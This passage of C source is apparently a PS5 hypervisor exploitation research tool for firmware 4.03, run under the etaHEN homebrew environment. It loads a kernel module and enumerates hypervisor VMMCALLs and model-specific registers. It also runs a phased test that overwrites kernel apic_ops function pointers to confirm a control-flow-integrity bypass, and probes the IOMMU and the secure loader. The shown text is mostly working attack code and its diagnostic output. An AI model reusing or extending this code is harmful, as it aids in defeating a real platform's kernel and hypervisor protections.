            printf("    Try disabling VMMCALL campaigns (set RUN_VMMCALL_ENUM=0).\n");
        } else if (first_qword == 0) {
            printf("[!] Buffer still all zeros after all init paths.\n");
            printf("    Possible causes:\n");
            printf("    - kldstat returned wrong base (relocs not applied)\n");
            printf("    - IDT hook didn't reach trampoline\n");
            printf("    - HV trapped execution from module pages\n");
        } else {
            printf("[!] Unexpected first qword: 0x%llx\n",
                   (unsigned long long)first_qword);
        }

        /* kldsym diagnostic */
        printf("\n[*] Diagnostic: trying kldsym...\n");
        struct kld_sym_lookup sym;
        memset(&sym, 0, sizeof(sym));
        sym.version = sizeof(struct kld_sym_lookup);
        sym.symname = "hv_results";
        ret = syscall(SYS_kldsym, kid, KLDSYM_LOOKUP, &sym);
        printf("    kldsym ret=%d, symvalue=0x%lx, symsize=%lu\n",
               ret, (unsigned long)sym.symvalue, (unsigned long)sym.symsize);

        /* kernel_copyout diagnostic */
        printf("    Trying kernel_copyout from DMAP KVA 0x%lx...\n",
               (unsigned long)result_kva);
        struct kmod_result_buf kc_results;
        kernel_copyout(result_kva, &kc_results, sizeof(kc_results));
        printf("    kernel_copyout magic: 0x%llx\n",
               (unsigned long long)kc_results.magic);
    } else {
        printf("[+] KMOD_MAGIC found! Shared memory communication working!\n");
        printf("[+] Kmod status: %s\n",
               results->status == KMOD_STATUS_DONE ? "COMPLETE" :
               results->status == KMOD_STATUS_RUNNING ? "STILL RUNNING (crashed?)" :
               "UNKNOWN");

        /* Display MSR results */
        if (results->num_msr_results > 0) {
            printf("\n[+] MSR/CR Reconnaissance Results (%u entries):\n",
                   results->num_msr_results);
            for (uint32_t i = 0; i < results->num_msr_results && i < 32; i++) {
                uint32_t msr_id = results->msr_results[i].msr_id;
                uint64_t value  = results->msr_results[i].value;
                const char *name = "";

                switch (msr_id) {
                    case 0xC0000080: name = "EFER"; break;
                    case 0xC0000081: name = "STAR"; break;
                    case 0xC0000082: name = "LSTAR"; break;
                    case 0xC0000084: name = "SFMASK"; break;
                    case 0xC0000100: name = "FS_BASE"; break;
                    case 0xC0000101: name = "GS_BASE"; break;
                    case 0xC0000102: name = "KGS_BASE"; break;
                    case 0xC0000103: name = "TSC_AUX"; break;
                    case 0xFFFF0000: name = "CR0"; break;
                    case 0xFFFF0003: name = "CR3"; break;
                    case 0xFFFF0004: name = "CR4"; break;
                    default: name = "???"; break;
                }
                printf("    %-10s (0x%08x) = 0x%016lx\n", name, msr_id, value);
            }
        }

        /* Display VMMCALL results */
        if (results->num_results > 0) {
            printf("\n[+] VMMCALL Enumeration Results (%u entries):\n", results->num_results);
            printf("    %-6s %-18s %-18s %-18s %-10s %-4s\n",
                   "RAX_in", "RAX_out", "RCX_out", "RDX_out", "Campaign", "OK");
            printf("    %-6s %-18s %-18s %-18s %-10s %-4s\n",
                   "------", "------------------", "------------------",
                   "------------------", "----------", "----");

            for (uint32_t i = 0; i < results->num_results && i < KMOD_MAX_RESULTS; i++) {
                const struct vmmcall_result *r = &results->results[i];
                printf("    0x%04lx 0x%016lx 0x%016lx 0x%016lx  camp=%u     %s\n",
                       (unsigned long)r->rax_in, (unsigned long)r->rax_out,
                       (unsigned long)r->rcx_out, (unsigned long)r->rdx_out,
                       r->campaign_id, r->survived ? "YES" : "NO");
            }
        } else if (results->status == KMOD_STATUS_RUNNING) {
            printf("\n[-] No VMMCALL results. Module init appears to have crashed during:\n");
            printf("    Campaign %u, probe %u\n",
                   results->current_campaign, results->current_probe);
        }
    }

    /* Display APIC_OPS Campaign Results (campaign_id=5) */
    {
        int has_apic = 0;
        for (uint32_t i = 0; i < results->num_results && i < KMOD_MAX_RESULTS; i++) {
            if (results->results[i].campaign_id == 5) { has_apic = 1; break; }
        }
        if (has_apic) {
            printf("\n=============================================\n");
            printf("  APIC_OPS Ring-0 CFI Bypass Test Results\n");
            printf("=============================================\n\n");

            for (uint32_t i = 0; i < results->num_results && i < KMOD_MAX_RESULTS; i++) {
                const struct vmmcall_result *r = &results->results[i];
                if (r->campaign_id != 5) continue;

                uint64_t phase = r->rax_in;

                if (phase == 0) {
                    /* Discovery */
                    printf("[*] Phase 0: apic_ops Discovery\n");
                    printf("    Address:     0x%lx (kdata+0x%lx)\n",
                           (unsigned long)r->rax_out,
                           (unsigned long)r->rcx_in);
                    printf("    Consecutive ktext ptrs: %lu\n",
                           (unsigned long)r->rcx_out);
                    printf("    Valid structure: %s\n",
                           r->survived ? "YES (>=20 ptrs)" : "NO (<20 ptrs, scanning...)");
                    printf("    First 4 pointers:\n");
                    printf("      [0] create:     0x%lx\n", (unsigned long)r->rdx_out);
                    printf("      [1] init:       0x%lx\n", (unsigned long)r->rdi_out);
                    printf("      [2] xapic_mode: 0x%lx\n", (unsigned long)r->rsi_out);
                    printf("      [3] is_x2apic:  0x%lx\n", (unsigned long)r->r8_out);
                }
                else if (phase == 1) {
                    /* Read */
                    printf("\n[*] Phase 1: xapic_mode Read\n");
                    printf("    Found apic_ops at: 0x%lx (kdata+0x%lx)\n",
                           (unsigned long)r->rcx_out,
                           (unsigned long)r->rcx_in);
                    printf("    Table size: %lu consecutive ptrs\n",
                           (unsigned long)r->rdx_out);
                    printf("    xapic_mode value: 0x%lx\n",
                           (unsigned long)r->rax_out);
                }
                else if (phase == 2) {
                    /* Same-value writeback */
                    printf("\n[+] Phase 2: Same-Value Writeback Test (THE CRITICAL TEST)\n");
                    printf("    Wrote:    0x%lx\n", (unsigned long)r->rcx_out);
                    printf("    Readback: 0x%lx\n", (unsigned long)r->rax_out);
                    printf("    Match:    %s\n", r->rdx_out ? "YES" : "NO");
                    if (r->survived) {
                        printf("    ============================================\n");
                        printf("    SURVIVED! Ring-0 direct store bypasses CFI!\n");
                        printf("    ============================================\n");
                        printf("    Previous userland tests via kernel_copyin() crashed.\n");
                        printf("    Ring 0 mov instruction has NO CFI checks.\n");
                    } else {
                        printf("    CRASHED - CFI may be hardware-enforced.\n");
                    }
                }
                else if (phase == 3) {
                    /* Cross-type write */
                    printf("\n[+] Phase 3: Cross-Type Write Test\n");
                    printf("    Wrote apic_ops[5] (dump) to slot [2] (xapic_mode)\n");
                    printf("    Written: 0x%lx\n", (unsigned long)r->rcx_out);
                    printf("    Readback: 0x%lx\n", (unsigned long)r->rax_out);
                    printf("    Match:    %s\n", r->rdx_out ? "YES" : "NO");
                    printf("    Restored: 0x%lx\n", (unsigned long)r->rdi_out);
                    if (r->survived) {
                        printf("    ============================================\n");
                        printf("    FULL CFI BYPASS CONFIRMED!\n");
                        printf("    ============================================\n");
                        printf("    Cross-type function pointer write succeeded.\n");
                        printf("    apic_ops pointers can be hijacked from ring 0.\n");
                    }
                }
                else if (phase == 4) {
                    /* Final verify */
                    printf("\n[*] Phase 4: Final Verification\n");
                    printf("    Current xapic_mode: 0x%lx\n", (unsigned long)r->rax_out);
                    printf("    Original value:     0x%lx\n", (unsigned long)r->rcx_out);
                    printf("    Restored correctly: %s\n", r->rdx_out ? "YES" : "NO");
                    printf("    apic_ops addr: 0x%lx (%lu ptrs)\n",
                           (unsigned long)r->rdi_out, (unsigned long)r->rsi_out);
                }
            }
            printf("\n");
        }
    }

    /* Step 5: Unload the module */
    printf("\n[*] Step 5: Unloading kernel module...\n");
    ret = syscall(SYS_kldunload, kid);
    if (ret < 0) {
        printf("[!] kldunload failed: errno=%d (%s)\n", errno, strerror(errno));
        printf("    Module may still be loaded in kernel memory.\n");
    } else {
        printf("[+] Module unloaded successfully.\n");
    }

    /* Clean up the .ko file */
    unlink("/data/etaHEN/hv_kmod.ko");

    notify("[HV Research] Kmod kldload campaign complete!");
}

/* ─── Main entry point ─── */

int main(void) {
    notify("[HV Research] main() entered");

    FILE *f = fopen("/data/etaHEN/hv_research.log", "w");
    if (f) {
        fclose(f);
        freopen("/data/etaHEN/hv_research.log", "w", stdout);
        freopen("/data/etaHEN/hv_research.log", "a", stderr);
        /* Force line-buffered so every \n flushes to disk immediately.
         * Without this, file-backed stdout is fully-buffered and a
         * crash/hang loses all unflushed printf output. */
        setvbuf(stdout, NULL, _IOLBF, 0);
        setvbuf(stderr, NULL, _IOLBF, 0);
    } else {
        notify("[HV Research] ERROR: fopen log failed!");
    }

    printf("\n");
    printf("==============================================\n");
    printf("  PS5 Hypervisor Research Tool\n");
    printf("  Target: FW 4.03 (educational/personal use)\n");
    printf("==============================================\n\n");
    fflush(stdout);

    notify("[HV Research] Starting...");

    /* Step 1: Initialize FW-specific offsets */
    if (init_fw_offsets() != 0) {
        printf("[-] Failed to initialize FW offsets\n");
        return 1;
    }

    /* Step 2: Discover DMAP base */
    if (discover_dmap_base() != 0) {
        printf("[-] Failed to discover DMAP base\n");
        printf("[!] Continuing without DMAP (limited functionality)\n");
    }

    /* Step 3: Initialize direct SBL communication */
    if (g_dmap_base) {
        if (init_sbl_direct() != 0) {
            printf("[-] Failed to initialize SBL direct communication\n");
            printf("[!] SBL campaigns will be skipped\n");
        }
    }

    /* Step 4: Try to discover SBL kernel offsets */
    if (g_dmap_base) {
        discover_sbl_offsets();
    }

    /* Run research campaigns */
    campaign_kernel_recon();

    /* Campaign 7: Kernel module via kldload (highest priority) */
    campaign_kmod_kldload();

    if (g_dmap_base) {
        campaign_iommu_recon();
    }

    if (g_msg_vaddr) {
        campaign_sbl_cmd_enum();
        campaign_authmgr_func_enum();
        campaign_verify_header_probe();
        campaign_load_block_outpa();
    }

    printf("\n==============================================\n");
    printf("  All campaigns complete.\n");
    printf("==============================================\n");

    fflush(stdout);
    fflush(stderr);

    notify("[HV Research] Done! Check /data/etaHEN/hv_research.log");

    return 0;
}
